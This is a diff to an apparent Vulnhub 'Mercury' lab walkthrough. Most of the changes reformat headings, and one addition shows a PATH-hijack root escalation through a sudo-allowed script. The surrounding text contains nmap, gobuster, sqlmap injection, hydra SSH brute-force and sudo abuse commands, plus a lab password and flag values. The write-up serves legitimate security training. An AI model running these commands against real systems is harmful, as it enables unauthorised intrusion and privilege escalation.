@@ -8,7 +8,8 @@ tags: [Vulnhub,nmap,sql injection,sqlmap,PATH Variable,sudo -l]
 
 ![image](../assets/post_img/Snipaste_2024-04-23_20-53-22.png)
 
-# Description
+## Description
+
 Mercury is an easier box, with no bruteforcing required.
 There are two flags on the box: a user and root flag which include an md5 hash.
 This has been tested on VirtualBox so may not work correctly on VMware.
@@ -16,8 +17,9 @@ Any questions/issues or feedback please email me at: SirFlash at protonmail.com
 
 ---
 
-# Recon
-## Nmap
+## Recon
+
+### Nmap
 
 ```console
 VICTIM_IP=192.168.1.57
@@ -26,7 +28,7 @@ nmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP
 ```
 From the nmap results, we can see that there is port 8080 which is a web service that running on the server and on port 22 is SSH.
 
-## Website - TCP 8080
+### Website - TCP 8080
 
 ```
 Hello. This site is currently in development please check back later.
@@ -36,7 +38,7 @@ nothing
 
 ![image](../assets/post_img/Snipaste_2024-04-23_21-56-35.png)
 
-## Directory brute force attack
+### Directory brute force attack
 
 ```console
 gobuster dir -u http://192.168.1.57:8080/ -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
@@ -98,9 +100,9 @@ http://192.168.1.57:8080/mercuryfacts/'/
 ![image](../assets/post_img/Snipaste_2024-04-23_22-13-18.png)
 
 
-# Foothold sql injection
+## Foothold sql injection
 
-##  sql injection
+###  sql injection
 
 ```console
 sqlmap -r sqli.txt --batch -v 3
@@ -174,7 +176,7 @@ hydra -L usernames.txt -P passwords.txt 192.168.1.57 ssh -t 4
 ```
 
 
-## SSH as webmaster
+### SSH as webmaster
 
 ```bash
 ssh webmaster@192.168.1.57
@@ -184,13 +186,13 @@ mercuryisthesizeof0.056Earths
 ![image](../assets/post_img/Snipaste_2024-04-23_22-29-32.png)
 
 
-## user_flag.txt
+### user_flag.txt
 
 ```console
 [user_flag_8339915c9a454657bd60ee58776f4ccd]
 ```
 
-## Shell as linuxmaster
+### Shell as linuxmaster
 
 ```
 webmaster@mercury:~/mercury_proj$ cat notes.txt 
@@ -220,9 +222,9 @@ uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsy
 ```
 ![image](../assets/post_img/Snipaste_2024-04-23_22-55-45.png)
 
-# Shell as Root
+## Shell as Root
 
-## sudo -l
+### sudo -l
 
 ```bash
 linuxmaster@mercury:~$ sudo -l
@@ -243,7 +245,7 @@ linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
 #!/bin/bash
 tail -n 10 /var/log/syslog
 ```
-## Linux Privilege Escalation with PATH Variable
+### Linux Privilege Escalation with PATH Variable
 
 我们可以劫持此PATH导致权限提升
 
@@ -257,7 +259,17 @@ root@mercury:~# ls
 root_flag.txt
 ```
 
-## root_flag.txt
+```bash
+也可以使用这种方式进行利用
+
+ln -s /usr/bin/vim tail
+export PATH=$(pwd):$PATH
+sudo --preserve-env=PATH /usr/bin/check_syslog.sh
+
+:!/bin/bash
+```
+
+### root_flag.txt
 
 ```console
 root@mercury:~# cat root_flag.txt 
